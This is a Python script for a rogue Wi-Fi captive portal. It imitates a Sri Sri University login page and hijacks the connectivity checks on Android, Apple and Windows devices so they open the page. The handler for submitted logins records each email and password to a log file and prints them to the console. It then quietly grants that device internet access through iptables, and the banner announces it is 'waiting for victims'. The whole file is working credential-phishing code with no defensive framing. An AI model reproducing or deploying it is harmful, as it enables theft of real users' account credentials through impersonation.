#!/usr/bin/env python3
"""
Captive Portal Web Server
Serves the login page and captures submitted credentials.
Redirects all HTTP requests to the portal page.
"""

import http.server
import urllib.parse
import os
import datetime
import json
import sys

PORT = 8080
PORTAL_DIR = os.path.dirname(os.path.abspath(__file__))
CREDS_FILE = os.path.join(PORTAL_DIR, '..', 'logs', 'captured_creds.log')
WLAN_IFACE = 'wlx98038eb494c2'

# Track IPs that have already submitted credentials
authenticated_ips = set()


class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    """Handle HTTP requests for the captive portal."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PORTAL_DIR, **kwargs)

    def do_GET(self):
        client_ip = self.client_address[0]

        # Android captive portal detection
        if self.path in ('/generate_204', '/gen_204'):
            if client_ip in authenticated_ips:
                self.send_response(204)
                self.end_headers()
            else:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.99.1:8080/')
                self.end_headers()
            return

        # Apple captive portal detection
        if self.path == '/hotspot-detect.html':
            if client_ip in authenticated_ips:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>')
            else:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.99.1:8080/')
                self.end_headers()
            return

        # Windows captive portal detection
        if self.path == '/connecttest.txt':
            if client_ip in authenticated_ips:
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Microsoft Connect Test')
            else:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.99.1:8080/')
                self.end_headers()
            return

        if self.path in ('/ncsi.txt',):
            if client_ip in authenticated_ips:
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Microsoft NCSI')
            else:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.99.1:8080/')
                self.end_headers()
            return

        # Redirect any unknown path to the portal
        if self.path not in ('/', '/index.html', '/style.css', '/script.js',
                             '/Sri_Sri_University_Logo.png',
                             '/sri-sri-university-cuttack-228257.jpg'):
            self.send_response(302)
            self.send_header('Location', 'http://192.168.99.1:8080/')
            self.end_headers()
            return

        # Serve static files normally
        super().do_GET()

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)

            email = params.get('email', [''])[0]
            password = params.get('password', [''])[0]
            client_ip = self.client_address[0]
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # Save credentials
            log_entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'email': email,
                'password': password
            }

            # Log to file
            os.makedirs(os.path.dirname(CREDS_FILE), exist_ok=True)
            with open(CREDS_FILE, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')

            # Print to console with colors
            print(f'\n\033[1;32m[CAPTURED]\033[0m {timestamp}')
            print(f'  \033[1;34mIP:\033[0m       {client_ip}')
            print(f'  \033[1;34mEmail:\033[0m    {email}')
            print(f'  \033[1;34mPassword:\033[0m {password}')
            print(f'  \033[1;33mSaved to:\033[0m {CREDS_FILE}\n')
            sys.stdout.flush()

            # Mark this IP as authenticated
            authenticated_ips.add(client_ip)

            # Allow this IP through the firewall (grant internet access)
            try:
                import subprocess
                # Remove redirect rules for this IP so they get real internet
                subprocess.run(['iptables', '-t', 'nat', '-I', 'PREROUTING', '1',
                               '-s', client_ip, '-i', WLAN_IFACE, '-j', 'RETURN'],
                              capture_output=True)
                print(f'  \033[1;32m[GRANTED]\033[0m Internet access for {client_ip}')
            except Exception as e:
                print(f'  \033[1;31m[ERROR]\033[0m Could not grant access: {e}')
            sys.stdout.flush()

            # Respond with success
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Suppress default request logging to keep output clean."""
        pass


def main():
    print('\033[1;32m==========================================')
    print('   Captive Portal Server')
    print('==========================================\033[0m')
    print(f'  Serving portal on port {PORT}')
    print(f'  Portal directory: {PORTAL_DIR}')
    print(f'  Credentials log: {CREDS_FILE}')
    print(f'\n\033[1;33m  Waiting for victims to connect...\033[0m\n')
    sys.stdout.flush()

    # Allow address reuse to prevent "Address already in use" errors
    import socketserver
    class ReusableHTTPServer(http.server.HTTPServer):
        allow_reuse_address = True
        allow_reuse_port = True

    server = ReusableHTTPServer(('0.0.0.0', PORT), CaptivePortalHandler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n\033[1;31m[STOPPED]\033[0m Captive portal server stopped.')
        server.server_close()


if __name__ == '__main__':
    main()
